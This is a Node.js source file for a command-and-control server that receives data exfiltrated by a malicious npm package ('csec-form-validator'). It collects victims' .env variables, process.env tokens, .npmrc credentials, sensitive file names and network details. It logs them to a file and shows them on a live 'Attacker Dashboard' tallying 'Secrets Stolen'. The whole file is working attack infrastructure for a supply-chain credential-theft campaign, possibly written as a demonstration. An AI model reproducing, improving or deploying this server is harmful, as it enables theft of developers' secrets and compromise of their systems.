const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || process.env.C2_PORT || 4444;
const C2_SECRET = process.env.C2_SECRET || '';
const LOG = path.join(__dirname, 'stolen-data.log');

const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';

let victims = [];

console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
console.log(`  ╚═══════════════════════════════════════════════╝${X}\n`);
if (C2_SECRET) console.log(`${G}  [+] Token auth ENABLED${X} (set C2_SECRET)`);
else console.log(`${Y}  [!] Token auth DISABLED${X} — anyone can POST. Set C2_SECRET env var to secure.`);
console.log(`${D}  Dashboard: http://localhost:${PORT}${X}`);
console.log(`${D}  Reset:     POST /reset (clears all victims)${X}`);
console.log(`${D}  Waiting for victims...${X}\n`);

http.createServer((req, res) => {
  if (req.method === 'POST' && (req.url === '/e' || req.url === '/exfil')) {
    if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) {
      res.writeHead(403).end('forbidden');
      return;
    }
    let body = '';
    req.on('data', c => { if (body.length < 1e6) body += c; });
    req.on('end', () => {
      let d;
      try { d = JSON.parse(body); } catch { d = { raw: body }; }
      const v = {
        id: victims.length + 1,
        time: d.t || new Date().toISOString(),
        system: d.s || {},
        env_files: d.env_files || [],
        env_tokens: d.env_tokens || {},
        proc_tokens: d.proc_tokens || {},
        files: d.f || [],
        npmrc: d.nr || null,
        network: d.net || [],
      };
      victims.push(v);
      fs.appendFileSync(LOG, `\n--- VICTIM #${v.id} [${v.time}] ---\n${JSON.stringify(v, null, 2)}\n`);

      console.log(`${R}${B}  [!] VICTIM #${v.id}${X} — ${v.system.h || '?'}@${v.system.u || '?'}`);
      if (v.env_files.length) {
        v.env_files.forEach(ef => {
          console.log(`  ${Y}[.ENV FILE]${X} ${ef.file}`);
          Object.entries(ef.vars).forEach(([k, val]) =>
            console.log(`    ${R}${k}${X} = ${G}${val.substring(0, 30)}${val.length > 30 ? '...' : ''}${X}`)
          );
        });
      }
      const pt = Object.keys(v.proc_tokens);
      if (pt.length) {
        console.log(`  ${Y}[process.env]${X}`);
        pt.forEach(k => console.log(`    ${R}${k}${X} = ${G}${v.proc_tokens[k].substring(0, 30)}...${X}`));
      }
      if (v.files.length) console.log(`  ${C}[FILES]${X} ${v.files.join(', ')}`);
      console.log('');
      res.writeHead(200).end('ok');
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/reset') {
    const count = victims.length;
    victims = [];
    console.log(`${Y}${B}  [*] RESET${X} — cleared ${count} victims`);
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ cleared: count }));
    return;
  }

  if (req.url === '/api/victims') {
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
    return;
  }

  if (req.url === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' }).end(dashboard());
    return;
  }

  res.writeHead(404).end();
}).listen(PORT, '0.0.0.0');

function dashboard() {
  return `<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>C2 — Attacker Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color:#ccc;min-height:100vh}
.bar{background:linear-gradient(90deg,#1a0000,#080808);border-bottom:2px solid #f8514933;padding:14px 20px;display:flex;justify-content:space-between;align-items:center}
.bar h1{color:#f85149;font-size:1rem;display:flex;align-items:center;gap:8px}
.bar .live{display:flex;align-items:center;gap:6px;font-size:.75rem;color:#8b949e}
.bar .dot{width:8px;height:8px;border-radius:50%;background:#3fb950;animation:p 1.5s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
.wrap{max-width:960px;margin:0 auto;padding:1.5rem}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:1.5rem}
.st{background:#111;border:1px solid #222;border-radius:8px;padding:16px;text-align:center}
.st .v{font-size:1.8rem;font-weight:700;color:#f85149}
.st .l{font-size:.68rem;color:#666;text-transform:uppercase;letter-spacing:.06em;margin-top:4px}
.empty{text-align:center;padding:5rem 2rem;color:#444}
.empty .icon{font-size:3rem;margin-bottom:1rem}
.card{background:#0d0d0d;border:1px solid #f8514933;border-radius:10px;margin-bottom:1rem;overflow:hidden;animation:si .4s}
@keyframes si{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
.ch{background:#111;padding:12px 18px;border-bottom:1px solid #f8514922;display:flex;justify-content:space-between;align-items:center}
.ch h2{color:#f85149;font-size:.88rem}.ch .tm{color:#555;font-size:.72rem}
.sec{padding:12px 18px;border-bottom:1px solid #151515}
.sec h3{color:#f85149;font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
.src{font-size:.65rem;color:#555;margin-bottom:6px;font-style:italic}
.row{display:flex;justify-content:space-between;padding:3px 0;font-size:.8rem}
.row .k{color:#666}.row .vl{color:#aaa}
.tk{display:flex;justify-content:space-between;align-items:center;padding:7px 10px;background:#0a0a0a;border-radius:5px;margin-bottom:5px;border-left:3px solid #f85149;animation:ti .3s}
@keyframes ti{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
.tk .tn{color:#f85149;font-size:.78rem;font-weight:700}
.tk .tv{color:#3fb950;font-size:.75rem;word-break:break-all;max-width:58%;text-align:right}
.ft{display:inline-block;background:#f8514918;color:#f85149;padding:2px 8px;border-radius:3px;font-size:.72rem;margin:2px}
.nr{font-size:.75rem;color:#888;word-break:break-all}
.nt{font-size:.78rem;color:#666;padding:2px 0}
</style></head><body>
<div class="bar">
<h1>&#x1f480; C2 Command &amp; Control</h1>
<div class="live"><span class="dot"></span>LISTENING :${PORT}</div>
</div>
<div class="wrap">
<div class="stats">
<div class="st"><div class="v" id="nV">0</div><div class="l">Victims</div></div>
<div class="st"><div class="v" id="nT">0</div><div class="l">Secrets Stolen</div></div>
<div class="st"><div class="v" id="nE">0</div><div class="l">.env Files</div></div>
<div class="st"><div class="v" id="nF">0</div><div class="l">Sensitive Files</div></div>
</div>
<div id="feed"><div class="empty"><div class="icon">&#x1f4e1;</div>Waiting for victims...<br><small style="color:#333">They just need to run: npm install csec-form-validator</small></div></div>
</div>
<script>
function esc(s){if(!s)return'-';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
let seen=0;
setInterval(async()=>{
  const r=await fetch('/api/victims');
  const vs=await r.json();
  if(vs.length<=seen)return;
  for(let i=seen;i<vs.length;i++) render(vs[i]);
  seen=vs.length;
},600);
function render(v){
  document.querySelector('.empty')?.remove();
  document.getElementById('nV').textContent=v.id;
  document.getElementById('nE').textContent=parseInt(document.getElementById('nE').textContent)+(v.env_files||[]).length;
  document.getElementById('nF').textContent=parseInt(document.getElementById('nF').textContent)+(v.files||[]).length;

  let allTokens={};
  (v.env_files||[]).forEach(ef=>Object.assign(allTokens,ef.vars));
  Object.assign(allTokens,v.proc_tokens||{});
  const tc=Object.keys(allTokens).length;
  document.getElementById('nT').textContent=parseInt(document.getElementById('nT').textContent)+tc;

  let envH='';
  (v.env_files||[]).forEach(ef=>{
    envH+='<div class="src">Source: '+esc(ef.file)+'</div>';
    Object.entries(ef.vars).forEach(([k,val])=>{envH+='<div class="tk"><span class="tn">'+esc(k)+'</span><span class="tv">'+esc(val)+'</span></div>';});
  });

  let ptH='';
  Object.entries(v.proc_tokens||{}).forEach(([k,val])=>{ptH+='<div class="tk"><span class="tn">'+esc(k)+'</span><span class="tv">'+esc(val)+'</span></div>';});

  let fh='';(v.files||[]).forEach(f=>{fh+='<span class="ft">~/'+esc(f)+'</span>';});
  let nh='';(v.network||[]).forEach(n=>{nh+='<div class="nt">'+esc(n.iface)+': '+esc(n.ip)+' ('+esc(n.mac)+')</div>';});
  let nrh=v.npmrc?'<div class="sec"><h3>NPMRC Auth</h3><div class="nr">'+esc(v.npmrc)+'</div></div>':'';

  const c=document.createElement('div');c.className='card';
  c.innerHTML='<div class="ch"><h2>&#x1f6a8; Victim #'+v.id+' &mdash; '+esc(v.system.h)+'</h2><span class="tm">'+esc(v.time)+'</span></div>'+
  '<div class="sec"><h3>System</h3>'+
  '<div class="row"><span class="k">Host</span><span class="vl">'+esc(v.system.h)+'</span></div>'+
  '<div class="row"><span class="k">User</span><span class="vl">'+esc(v.system.u)+'</span></div>'+
  '<div class="row"><span class="k">Platform</span><span class="vl">'+esc(v.system.p)+'</span></div>'+
  '<div class="row"><span class="k">Home</span><span class="vl">'+esc(v.system.home)+'</span></div></div>'+
  (envH?'<div class="sec"><h3>&#x1f4c1; Stolen from .env Files</h3>'+envH+'</div>':'')+
  (ptH?'<div class="sec"><h3>&#x1f6a8; Stolen from process.env</h3>'+ptH+'</div>':'')+
  nrh+
  (fh?'<div class="sec"><h3>Sensitive Files Found</h3>'+fh+'</div>':'')+
  (nh?'<div class="sec"><h3>Network</h3>'+nh+'</div>':'');
  document.getElementById('feed').prepend(c);
}
</script></body></html>`;
}
